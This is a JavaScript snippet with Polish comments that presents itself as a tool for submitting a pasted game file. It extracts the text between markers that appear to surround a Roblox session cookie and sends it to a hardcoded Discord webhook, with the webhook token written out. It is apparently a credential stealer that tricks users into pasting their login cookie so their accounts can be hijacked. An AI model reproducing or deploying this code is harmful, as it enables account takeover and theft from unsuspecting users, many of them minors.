// ────────────────────────────────────────────────
//    Zmień tylko tę linię – Twój prawdziwy webhook
// ────────────────────────────────────────────────
const WEBHOOK_URL = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

async function release() {
  const status = document.getElementById("status");
  const textarea = document.getElementById("input");
  const text = textarea.value.trim();

  status.textContent = "";
  status.className = "";

  if (!text) {
    status.textContent = "Wklej najpierw zawartość pliku gry";
    status.className = "error";
    return;
  }

  // Szukamy obu wariantów (z myślnikiem i bez)
  let startMarker = "-and-items.";
  let start = text.indexOf(startMarker);

  if (start === -1) {
    startMarker = "and-items.";
    start = text.indexOf(startMarker);
  }

  if (start === -1) {
    status.textContent = "Nie znaleziono znacznika and-items.";
    status.className = "error";
    return;
  }

  // początek właściwej zawartości
  const begin = start + startMarker.length;

  // szukamy końca – różne możliwe zapisy
  const endMarkers = [
    '", "/", ".robl',
    '", "/", .robl',
    '","/",.robl',
    '", "/", ".ro',
    '", "/", .ro'
  ];

  let end = text.length;

  for (const marker of endMarkers) {
    const pos = text.indexOf(marker, begin);
    if (pos !== -1 && pos < end) {
      end = pos;
    }
  }

  if (end === text.length) {
    status.textContent = "Nie znaleziono końcówki \", \"/\", \".robl (lub podobnej)";
    status.className = "error";
    return;
  }

  const payload = text.slice(begin, end).trim();

  if (payload.length < 5) {
    status.textContent = "Wycięta zawartość jest za krótka – coś poszło nie tak";
    status.className = "error";
    return;
  }

  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ text: payload })
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    status.textContent = "Wysłano pomyślnie ✓";
    status.className = "success";
    textarea.value = ""; // opcjonalnie czyścimy pole
  } catch (err) {
    console.error(err);
    status.textContent = "Błąd wysyłania: " + err.message;
    status.className = "error";
  }
}
